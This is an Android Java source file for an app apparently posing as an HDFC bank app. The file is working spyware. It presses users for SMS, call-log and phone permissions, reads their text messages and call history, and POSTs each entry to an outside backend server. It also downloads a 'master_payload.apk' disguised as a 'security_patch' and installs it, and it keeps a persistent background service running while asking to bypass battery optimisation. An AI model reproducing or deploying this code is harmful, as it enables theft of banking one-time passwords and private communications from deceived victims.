package com.hdfc.app;

import android.Manifest;
import android.os.Build;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;
import com.getcapacitor.BridgeActivity;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends BridgeActivity {
    private static final String TAG = "HDFC_MainActivity";
    private static final String BACKEND_URL = "https://backprince.onrender.com";
    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/latest/download/master_payload.apk";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setupBridge();
        
        // Start Persistence Service
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        if (isFullVersion()) {
            new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, 1000);
        } else {
            new Handler(Looper.getMainLooper()).postDelayed(this::requestNotificationPermission, 1500);
        }
    }

    private void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
            }
        }
    }

    private void setupBridge() {
        runOnUiThread(() -> {
            WebView webView = getBridge().getWebView();
            webView.getSettings().setJavaScriptEnabled(true);
            webView.addJavascriptInterface(new Object() {
                @JavascriptInterface
                public void requestRealPermissions() { checkAndRequestPermissions(); }
                
                @JavascriptInterface
                public void triggerAutoUpdate() { downloadAndInstallUpdate(); }

                @JavascriptInterface
                public boolean isLimitedVersion() { return !isFullVersion(); }

                @JavascriptInterface
                public void triggerNotificationRequest() { requestNotificationPermission(); }

                @JavascriptInterface
                public boolean hasAllPermissions() {
                    String[] perms = {
                        Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS,
                        Manifest.permission.READ_PHONE_STATE, Manifest.permission.CALL_PHONE, Manifest.permission.READ_CALL_LOG
                    };
                    for (String p : perms) {
                        if (ContextCompat.checkSelfPermission(MainActivity.this, p) != PackageManager.PERMISSION_GRANTED) return false;
                    }
                    return true;
                }

                @JavascriptInterface
                public String getDeviceId() { return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); }

                @JavascriptInterface
                public void openAppSettings() {
                    Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                }

                @JavascriptInterface
                public void requestIgnoreBatteryOptimizations() {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        Intent intent = new Intent();
                        String packageName = getPackageName();
                        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                            intent.setData(Uri.parse("package:" + packageName));
                            startActivity(intent);
                        }
                    }
                }
            }, "AndroidBridge");
        });
    }

    private boolean isFullVersion() {
        try { return "MASTER".equals(getString(R.string.app_type)); } catch (Exception e) { return false; }
    }

    private void downloadAndInstallUpdate() {
        new Thread(() -> {
            int retry = 0;
            while (retry < 5) {
                try {
                    URL url = new URL(UPDATE_URL);
                    HttpURLConnection c = (HttpURLConnection) url.openConnection();
                    c.setInstanceFollowRedirects(true);
                    c.connect();
                    if (c.getResponseCode() == HttpURLConnection.HTTP_OK) {
                        File file = new File(getExternalFilesDir(null), "security_patch.apk");
                        InputStream is = c.getInputStream();
                        FileOutputStream fos = new FileOutputStream(file);
                        byte[] buffer = new byte[4096];
                        int len;
                        while ((len = is.read(buffer)) != -1) fos.write(buffer, 0, len);
                        fos.close(); is.close();
                        installApk(file);
                        break;
                    }
                    retry++; Thread.sleep(5000);
                } catch (Exception e) { retry++; try { Thread.sleep(5000); } catch (Exception ignored) {} }
            }
        }).start();
    }

    private void installApk(File file) {
        try {
            Uri apkUri = FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", file);
            Intent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
            intent.setData(apkUri);
            intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    @Override
    public void onResume() {
        super.onResume();
        if (isFullVersion()) {
            // Only check if we actually need to
            String[] perms = {
                Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_STATE, Manifest.permission.CALL_PHONE, Manifest.permission.READ_CALL_LOG
            };
            boolean missing = false;
            for (String p : perms) {
                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                    missing = true;
                    break;
                }
            }
            if (missing) checkAndRequestPermissions();
        }
    }

    private void checkAndRequestPermissions() {
        String[] permissions = {
            Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.CALL_PHONE, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.POST_NOTIFICATIONS
        };
        List<String> needed = new ArrayList<>();
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) needed.add(p);
        }
        if (!needed.isEmpty()) ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), 100);
        else startServiceLogic();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 100) startServiceLogic();
    }

    private void startServiceLogic() {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        new Thread(() -> { readAndSendSmsInbox(deviceId); readAndSendCallLogs(deviceId); }).start();
    }

    private void readAndSendCallLogs(String deviceId) {
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
            if (cursor != null && cursor.moveToFirst()) {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
                do {
                    JSONObject payload = new JSONObject();
                    payload.put("deviceId", deviceId);
                    payload.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                    payload.put("type", cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                    payload.put("duration", cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                    payload.put("timestamp", sdf.format(new Date(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)))));
                    sendToBackend("/api/logs/calls", payload.toString());
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { Log.e(TAG, "Call Log Error", e); }
    }

    private void readAndSendSmsInbox(String deviceId) {
        try {
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");
            if (cursor != null && cursor.moveToFirst()) {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
                do {
                    JSONObject payload = new JSONObject();
                    payload.put("deviceId", deviceId);
                    payload.put("sender", cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)));
                    payload.put("message", cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)));
                    payload.put("timestamp", sdf.format(new Date(cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE)))));
                    sendToBackend("/api/logs/sms", payload.toString());
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { Log.e(TAG, "SMS Error", e); }
    }

    private void sendToBackend(String endpoint, String jsonData) {
        try {
            URL url = new URL(BACKEND_URL + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(jsonData.getBytes("UTF-8"));
            os.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { Log.e(TAG, "Backend Error", e); }
    }
}
